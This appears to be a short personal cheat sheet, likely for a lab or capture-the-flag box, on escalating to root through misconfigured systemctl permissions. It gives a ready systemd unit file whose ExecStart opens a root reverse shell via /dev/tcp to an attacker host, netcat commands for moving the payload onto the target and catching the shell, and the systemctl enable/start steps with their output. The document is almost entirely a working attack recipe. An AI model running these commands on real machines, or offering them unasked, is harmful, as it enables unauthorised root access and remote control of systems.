https://stackoverflow.com/questions/2491985/find-all-writable-files-in-the-current-directory

https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers/

https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49

0. Prepare your payload `root.service`
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
1. Find a directory that could write files 
```
find -type f -maxdepth 2 -writable
```
2. Transfter the payload
###### Init the target listening the port
```
nc -vl 44444 > root.service
```
###### Send file to traget
```
nc -n TargetIP 44444 < root.service
```
3. Start listening on the 9999
```
nc -lvnp 9999
```
4. Execute the payload(assume the file is under /var/tmp)
```
/bin/systemctl enable /var/tmp/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/tmp/root.service
Created symlink from /etc/systemd/system/root.service to /var/tmp/root.service
```
```
/bin/systemctl start root
```
5. listening on [any] 9999... now you get the root